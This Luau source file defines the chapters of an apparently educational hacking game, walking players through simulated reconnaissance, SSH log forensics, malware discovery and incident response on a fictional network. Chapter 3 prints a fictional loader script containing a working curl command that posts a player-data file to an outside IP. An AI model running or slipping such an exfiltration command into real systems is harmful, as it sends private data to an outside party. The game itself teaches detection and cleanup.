--[[
    ScenarioData.luau
    All chapter definitions for the CyberGame HackTablet.
]]

local ScenarioData = {}

-- ════════════════════════════════════════════════════════════════════
--  CHAPTER 1 — Active Reconnaissance
-- ════════════════════════════════════════════════════════════════════
ScenarioData.Chapter1_Recon = {
    type      = "terminal",
    title     = "Chapter 1: Active Reconnaissance",
    objective = "Scan nearby networks, capture packets, and gain access to the Bloxplay network.",
    welcomeMessage = [[
╔══════════════════════════════════════════════════╗
║     HACKTABLET v2.4  —  RECONNAISSANCE MODE     ║
║  Objective: Scan networks & capture packets      ║
╚══════════════════════════════════════════════════╝
You are outside Bloxplay HQ. Several WiFi networks
are visible from your position.
Type  help  to see available commands.
]],
    steps = {
        {
            id          = "ch1_help",
            instruction = "Open the command list. Type: help",
            hint        = "Start by checking what tools the tablet already exposes.",
            validCommands = { "help" },
            output      = [[
[*] HackOS SIM commands loaded.
    Key commands for this mission:
      scan [nearby|ip]   — discover devices
      sniff [ip]         — capture packet traffic
      packets [ip]       — open packet analyzer
      connect <ip>       — simulate network access
      ssh <user@ip>      — simulate SSH login
]],
        },
        {
            id          = "ch1_scan",
            instruction = "Scan for nearby devices. Type: scan nearby",
            hint        = "Begin with a reconnaissance command aimed at nearby targets.",
            validCommands = { "scan nearby", "scan" },
            output      = [[
[*] Scan target: nearby (sim)
    Bloxplay_ITWifi    [192.168.32.10]  open:53,67,68,80,443  role:Wireless gateway
    Bloxplay_AdminWifi [192.168.43.2]   open:22,80,443,8080   role:Admin wireless gateway
    Laptop             [192.168.32.12]  open:53,80,443,5151   role:Employee workstation
    PlayerData_Vault   [192.168.43.20]  open:22,80,443,3306   role:Player profile storage
    ...and more
[*] Hint: inspect traffic from the employee workstation next
]],
        },
        {
            id          = "ch1_sniff",
            instruction = "Capture packets from the employee laptop using the sniff tool.",
            hint        = "Follow traffic from the employee workstation, not the gateway.",
            validCommands = { "sniff 192.168.32.12" },
            output      = [[
[*] Sniffing Laptop (192.168.32.12) ... (sim)
[1] HTTP  192.168.32.12 -> 192.168.43.20  dns=playerdata.bloxplay.local  port=80
[2] TCP   192.168.32.12 -> 192.168.43.20  dns=auth.bloxplay.local        port=443
[3] HTTP  192.168.43.20 -> 203.44.18.77   dns=bloxplay.com               port=80
[4] DNS   192.168.32.10 -> 224.0.0.251    dns=admin.bloxplay.local       port=53
[5] HTTPS 192.168.32.12 -> 192.168.43.20  dns=playerdata.bloxplay.local  port=443
[*] Capture complete.
[*] Suspicious outbound traffic to 203.44.18.77 detected.
[*] Admin portal activity observed on bloxplay.com.
]],
        },
        {
            id          = "ch1_packets",
            instruction = "Use the browser packet analyzer and click Capture for the employee laptop.",
            hint        = "Open the browser, visit RBXPacketNet.com, enter 192.168.32.12, then click Capture.",
            suggestedCommand = "Open the browser, visit RBXPacketNet.com, enter 192.168.32.12, and click Capture.",
            validCommands = { "browser_capture 192.168.32.12" },
            output      = [[
[*] RBXPacketNet capture verified for Laptop (192.168.32.12).
[*] Browser capture confirms PlayerData_Vault traffic for the employee workstation.
]],
        },
        {
            id          = "ch1_connect",
            instruction = "Connect to the admin network gateway using the connect command.",
            hint        = "Pivot from reconnaissance into the admin-side gateway.",
            validCommands = { "connect 192.168.43.2" },
            output      = [[
[*] Resolving 192.168.43.2 ... (sim)
[*] Connected to Bloxplay_AdminWifi [192.168.43.2] (sim)
[*] You now have access to the admin network segment.
[*] Next: SSH into the player data vault.
]],
            isLastStep  = true,
        },
    },
}

-- ════════════════════════════════════════════════════════════════════
--  CHAPTER 2 — SSH Connection and Log Analysis
-- ════════════════════════════════════════════════════════════════════
ScenarioData.Chapter2_SSH = {
    type      = "terminal",
    title     = "Chapter 2: File System Forensics",
    objective = "Recover the vault credentials from a sticky note, SSH into the PlayerData_Vault, and inspect the filesystem for attacker evidence.",
    welcomeMessage = [[
HACKTABLET v2.4  -  FORENSICS MODE
Objective: Recover credentials, inspect metadata, and trace evidence.

Start in the browser and investigate the admin portal login page.
Someone left a sticky note out in the open with a vault lead on it.
]],
    steps = {
        {
            id          = "ch2_note",
            instruction = "Find the sticky note on the admin portal page.",
            hint        = "Open the browser, go to bloxplay.com/admin, and inspect the sticky note beside the login form.",
            suggestedCommand = "Open the browser, visit bloxplay.com/admin, and inspect the sticky note.",
            validCommands = { "browser_sticky_note inspect" },
            output      = [[
[*] Sticky note recovered:
    Portal: bloxplay.com/admin
    Username: bloxplay-admin
    Password: blox123
[*] Physical notes with credentials are a serious security risk.
]],
        },
        {
            id          = "ch2_ssh",
            instruction = "SSH into the PlayerData_Vault with the credentials from the sticky note.",
            hint        = "Use the bloxplay-admin account against 192.168.43.20.",
            validCommands = { "ssh bloxplay-admin@192.168.43.20" },
            output      = [[
[*] ssh: connecting to bloxplay-admin@192.168.43.20 ... (sim)
[*] Using credentials recovered from the sticky note (sim)
[*] Host key fingerprint verified (sim)
[*] Password accepted (sim)
[*] Welcome bloxplay-admin, connected to PlayerData_Vault
]],
        },
        {
            id          = "ch2_ls_root",
            instruction = "List the server root with metadata. Type: ls -l /",
            hint        = "Start by surveying the root directory in long-list form.",
            validCommands = { "ls -l /", "ls / -l", "ls -l" },
            output      = [[
[*] Listing / on PlayerData_Vault (sim)
drwx------ bloxplay-admin vaultops   2 item(s)  home/
drwxr-xr-x root           root       3 item(s)  var/
drwxr-xr-x root           root       3 item(s)  etc/
drwxr-x--- vaultsvc       vaultops   3 item(s)  srv/
-rw-r----- root           secops     302 B      auth.log
-rw-r----- bloxplay-admin vaultops   92 B       report.txt
-rwxr-x--- vaultsvc       vaultops   117 B      sync_jobs.sh
]],
        },
        {
            id          = "ch2_cd_srv",
            instruction = "Move into the exported data directory. Type: cd /srv",
            hint        = "The sensitive player exports live under the service data folder.",
            validCommands = { "cd /srv", "cd srv" },
            output      = [[
[*] Current directory: /srv
[*] You are now inside the live export directory.
]],
        },
        {
            id          = "ch2_stat_profiles",
            instruction = "Inspect the metadata for the profile export. Type: stat profiles.csv",
            hint        = "Use the metadata command against the player profile export inside /srv.",
            validCommands = { "stat profiles.csv", "stat /srv/profiles.csv" },
            output      = [[
[*] File: /srv/profiles.csv
[*] Type: file
[*] Owner: vaultsvc:vaultops
[*] Access: -rw-r-----
[*] Summary: Exported player profiles
]],
        },
        {
            id          = "ch2_cd_root",
            instruction = "Return to the server root. Type: cd /",
            hint        = "Head back to root so you can inspect the core evidence files there.",
            validCommands = { "cd /", "cd .." },
            output      = [[
[*] Current directory: /
[*] Returned to the root of PlayerData_Vault.
]],
        },
        {
            id          = "ch2_grep",
            instruction = 'Search for failed logins. Type: grep "Failed login" auth.log',
            hint        = "Search the auth log for unsuccessful sign-ins rather than reading every line manually.",
            validCommands = {
                'grep "failed login" auth.log',
                'grep "failed login" /auth.log',
                "grep failed auth.log",
                "grep failed login auth.log",
            },
            output      = [[
[*] Matches for "Failed login" in auth.log:
2026-03-24 08:02:14 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77
2026-03-24 08:02:27 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77
2026-03-24 08:12:40 sshd[1941]: Failed login for backup from 203.44.18.77
[*] All failed attempts originate from 203.44.18.77
]],
        },
        {
            id          = "ch2_find",
            instruction = "Search the filesystem for the suspicious sync script. Type: find / sync_jobs.sh",
            hint        = "Use the file search tool from the root of the server to locate the suspicious artifact.",
            validCommands = { "find / sync_jobs.sh", "find / sync_jobs" },
            output      = [[
[*] Matches for "sync_jobs.sh" under / (sim)
 /sync_jobs.sh
[*] Suspicious executable located at the server root.
]],
        },
        {
            id          = "ch2_cat_report",
            instruction = "Read the server report. Type: cat report.txt",
            hint        = "Review the short report file that summarizes what the server noticed.",
            validCommands = { "cat report.txt", "cat /report.txt" },
            output      = [[
--- report.txt ---
Server report (SIM)
- outbound traffic spike detected
- investigate running processes
- review netstat output
[*] Attacker IP confirmed: 203.44.18.77
[*] Chapter complete. Proceed to Chapter 3.
]],
            isLastStep  = true,
        },
    },
}

ScenarioData.Chapter3_Malware = {
    type      = "terminal",
    title     = "Chapter 3: Malware Discovery",
    objective = "Find the malware, identify data exfiltration, and trace the attacker's server.",
    welcomeMessage = [[
╔══════════════════════════════════════════════════╗
║      HACKTABLET v2.4  —  MALWARE SCAN MODE      ║
║   Objective: Find & analyze the malware          ║
╚══════════════════════════════════════════════════╝
You are still connected to PlayerData_Vault.
Something is running that should not be here.
]],
    steps = {
        {
            id          = "ch3_psrep",
            instruction = "List running processes. Type: psrep",
            hint        = "Check the process list before touching files or network state.",
            validCommands = { "psrep", "ps aux" },
            output      = [[
PID   NAME                STATUS    HOST=PlayerData_Vault
602   sshd                Running
774   vaultleafd          Running
911   profile-sync        Sleeping
1337  sync_jobs.sh        Running
[*] Finding: PID 1337 looks like WannaWail activity (fictional sim)
]],
        },
        {
            id          = "ch3_phishing",
            instruction = "Analyze the suspicious phishing lure with one of the mail-analysis tools.",
            hint        = "Use a phishing-analysis command on a message that sounds urgent or asks for verification.",
            validCommands = { "baitcheck", "decoymail" },
            requiresPhishingAnalysis = true,
            output      = [[
[*] Phishing analysis (sim)
- Pressure language detected
- Credential harvest risk elevated
- Authority impersonation likely
[*] Finding: the attacker paired WannaWail with a phishing-style lure.
]],
        },
        {
            id          = "ch3_cat_malware",
            instruction = "Read the suspicious script. Type: cat sync_jobs.sh",
            hint        = "Inspect the suspicious shell script directly.",
            validCommands = { "cat sync_jobs.sh", "cat /sync_jobs.sh" },
            output      = [[
--- sync_jobs.sh ---
#!/bin/sh
# WannaWail (fictional) exfil loader
curl -X POST http://203.44.18.77/upload --data-binary @/srv/profiles.csv
[*] This WannaWail loader is sending player profile data to an external server!
[*] C2 server identified: 203.44.18.77
]],
        },
        {
            id          = "ch3_netstat",
            instruction = "Check active network connections. Type: netstat",
            hint        = "Look for which external connection is still alive from the vault.",
            validCommands = { "netstat" },
            output      = [[
[*] Active connections on PlayerData_Vault (sim)
tcp  0  0  192.168.43.20:22   192.168.32.12:49822   ESTABLISHED
tcp  0  0  192.168.43.20:443  203.44.18.77:8080     ESTABLISHED
tcp  0  0  192.168.43.20:3306 192.168.43.25:54011   TIME_WAIT
[*] Finding: suspicious outbound connection to 203.44.18.77
]],
        },
        {
            id          = "ch3_malwarescan",
            instruction = "Run the malware scanner. Type: malwarescan",
            hint        = "Use the built-in scan to confirm what the suspicious script is doing.",
            validCommands = { "malwarescan" },
            output      = [[
[*] Malware scanner on PlayerData_Vault (sim)
[!] Alert: sync_jobs.sh flagged as WannaWail (fictional ransomware-style sample)
[!] IOC: outbound endpoint 203.44.18.77
[*] Recommended actions:
    kill 1337
    rm sync_jobs.sh
    passwd <new strong password>
[*] Chapter complete. Proceed to Chapter 4.
]],
            isLastStep  = true,
        },
    },
}

-- ════════════════════════════════════════════════════════════════════
--  CHAPTER 4 — Incident Response and System Hardening
-- ════════════════════════════════════════════════════════════════════
ScenarioData.Chapter4_IncidentResponse = {
    type      = "terminal",
    title     = "Chapter 4: Incident Response",
    objective = "Stop the attacker, remove the malware, and harden the system.",
    welcomeMessage = [[
╔══════════════════════════════════════════════════╗
║    HACKTABLET v2.4  —  INCIDENT RESPONSE MODE   ║
║   Objective: Stop the attack & secure the system ║
╚══════════════════════════════════════════════════╝
The attacker's script is still running.
You must act fast before more data is exfiltrated.
]],
    steps = {
        {
            id          = "ch4_kill",
            instruction = "Terminate the malicious process. Type: kill 1337",
            hint        = "Stop the suspicious PID before cleaning up anything else.",
            validCommands = { "kill 1337" },
            output      = [[
[*] Terminated PID 1337 (sync_jobs.sh) (sim)
[*] WannaWail activity halted and data exfiltration stopped.
]],
        },
        {
            id          = "ch4_rm",
            instruction = "Remove the exfiltration script. Type: rm sync_jobs.sh",
            hint        = "Delete the malicious script after its process is no longer running.",
            validCommands = { "rm sync_jobs.sh", "rm /sync_jobs.sh" },
            output      = [[
[*] Removed sync_jobs.sh (sim)
[*] WannaWail loader deleted from server.
]],
        },
        {
            id          = "ch4_passwd",
            instruction = "Set a strong new admin password. Type: passwd <new password>\n(Must be 12+ chars, mixed case, numbers, and symbols)",
            hint        = "Rotate the admin password with something long, mixed, and hard to guess.",
            validCommands = {
                "passwd newstr0ng#pass!",
                "passwd str0ngpass#1",
                "passwd bl0xplay#secure!",
                "passwd hackos#2026!",
                "passwd secur3p@ss!",
            },
            requiresStrongPassword = true,
            output      = [[
[*] passwd (sim): password updated successfully
[*] Admin credentials rotated. Attacker's stolen password is now invalid.
]],
        },
        {
            id          = "ch4_malwarescan_verify",
            instruction = "Run a final malware scan to confirm the system is clean. Type: malwarescan",
            hint        = "Verify the cleanup with one final scan.",
            validCommands = { "malwarescan" },
            output      = [[
[*] Malware scanner on PlayerData_Vault (sim)
[*] No malware indicators found.
[*] PID 1337 — terminated.
[*] sync_jobs.sh — removed.
[*] WannaWail - contained.
[*] Credentials - rotated.
[*] System status: SECURED
]],
        },
        {
            id          = "ch4_exit",
            instruction = "Close the SSH session now that the system is secured. Type: exit",
            hint        = "Close the remote session once the host is clean.",
            validCommands = { "exit" },
            output      = [[
[*] Connection to PlayerData_Vault closed.
╔══════════════════════════════════════════════════╗
║              MISSION COMPLETE                    ║
║                                                  ║
║  The attacker was identified:                    ║
║    Origin IP:  203.44.18.77                      ║
|    Method:     SSH brute force + WannaWail load  |
║    Data stolen: /srv/profiles.csv                ║
║                                                  ║
║  System secured:                                 ║
║    ✓ Malware terminated and removed              ║
║    ✓ Credentials rotated                         ║
║    ✓ Incident documented                         ║
╚══════════════════════════════════════════════════╝
]],
            isLastStep  = true,
        },
    },
}

return ScenarioData

